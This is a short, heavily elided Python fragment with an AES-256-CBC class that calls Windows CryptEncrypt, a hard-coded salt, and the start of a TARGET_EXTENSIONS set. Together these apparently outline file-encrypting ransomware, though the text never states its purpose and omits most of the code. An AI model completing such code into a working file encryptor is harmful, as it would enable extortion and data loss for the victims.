...
class AES256_CBC:
    ...
    def encrypt(self, plaintext):
        ...
        if not advapi32.CryptEncrypt(
            self.hKey, 0, True, 0, buf, ctypes.byref(wintypes.DWORD(buf_len)), buf_len
        ):
...
SALT = b'\x3a\x7c\x9f\x1e\xb2\x45\xd8\x61\xe9\x04\xf3\xa7\xc6\x1b\x5e\x82'
TARGET_EXTENSIONS = {
